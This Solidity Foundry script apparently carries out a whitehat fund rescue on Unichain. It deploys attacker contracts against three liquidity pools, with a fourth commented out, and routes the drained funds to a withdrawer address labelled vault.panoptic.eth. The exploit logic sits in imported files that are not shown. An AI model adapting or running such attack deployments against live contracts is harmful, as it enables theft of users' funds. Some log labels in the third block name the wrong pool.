// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import {ETH_USDT5bpsUnichainAttacker_Deployer, ETH_USDT5bpsUnichainAttacker} from "./attacker-contracts/Deployable_ETH_USDT_5bpsUnichain.sol";
import {WBTC_USDT5bpsUnichainAttacker_Deployer, WBTC_USDT5bpsUnichainAttacker} from "./attacker-contracts/Deployable_WBTC_USDT5bpsUnichain.sol";
import {WBTC_USDC30bpsUnichainAttacker_Deployer, WBTC_USDC30bpsUnichainAttacker} from "./attacker-contracts/Deployable_WBTC_USDC30bpsUnichain.sol";
import {ETH_WBTC5bpsUnichainAttacker_Deployer, ETH_WBTC5bpsUnichainAttacker} from "./attacker-contracts/Deployable_ETH_WBTC_5bpsUnichain.sol";

contract ExecuteUnichainWhitehatRound2 is Script {
    function run() public {
        uint256 DEPLOYER_PRIVATE_KEY = vm.envUint("DEPLOYER_PRIVATE_KEY");

        vm.startBroadcast(DEPLOYER_PRIVATE_KEY);

        // vault.panoptic.eth on unichain
        address withdrawer = 0x82BF455e9ebd6a541EF10b683dE1edCaf05cE7A1;

        console.log("Executing the first attack, on ETH/USDT5bps:");
        ETH_USDT5bpsUnichainAttacker_Deployer deployer1 = new ETH_USDT5bpsUnichainAttacker_Deployer{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("ETH_USDT5bpsUnichainAttacker_Deployer deployed at:", address(deployer1));
        console.log("ETH_USDT5bpsUnichainAttacker_Deployer succeeded");
        ETH_USDT5bpsUnichainAttacker attacker1 = deployer1.attacker();
        console.log("ETH_USDT5bpsUnichainAttacker deployed and holding funds at:", address(attacker1));

        console.log("Executing the second attack, on WBTC/USDT:");
        WBTC_USDT5bpsUnichainAttacker_Deployer deployer2 = new WBTC_USDT5bpsUnichainAttacker_Deployer{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("WBTC_USDT5bpsUnichainAttacker_Deployer deployed at:", address(deployer2));
        console.log("WBTC_USDT5bpsUnichainAttacker_Deployer succeeded");
        WBTC_USDT5bpsUnichainAttacker attacker2 = deployer2.attacker();
        console.log("WBTC_USDT5bpsUnichainAttacker deployed and holding funds at:", address(attacker2));

        console.log("Executing the third attack, on WBTC/USDC 30bps:");
        WBTC_USDC30bpsUnichainAttacker_Deployer deployer3 = new WBTC_USDC30bpsUnichainAttacker_Deployer{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("WBTC_USDT5bpsUnichainAttacker_Deployer deployed at:", address(deployer3));
        console.log("WBTC_USDT5bpsUnichainAttacker_Deployer succeeded");
        WBTC_USDC30bpsUnichainAttacker attacker3 = deployer3.attacker();
        console.log("WBTC_USDC30bpsUnichainAttacker deployed and holding funds at:", address(attacker3));

        /* console.log("Executing the fourth attack, on ETH/WBTC 5bps:");
        ETH_WBTC5bpsUnichainAttacker_Deployer deployer4 = new ETH_WBTC5bpsUnichainAttacker_Deployer{salt: bytes32(uint256(0x123))}(withdrawer);
        console.log("ETH_WBTC5bpsUnichainAttacker_Deployer deployed at:", address(deployer4));
        console.log("ETH_WBTC5bpsUnichainAttacker_Deployer succeeded");
        ETH_WBTC5bpsUnichainAttacker attacker4 = deployer4.attacker();
        console.log("ETH_WBTC5bpsUnichainAttacker deployed and holding funds at:", address(attacker4)); */

        vm.stopBroadcast();
    }
}
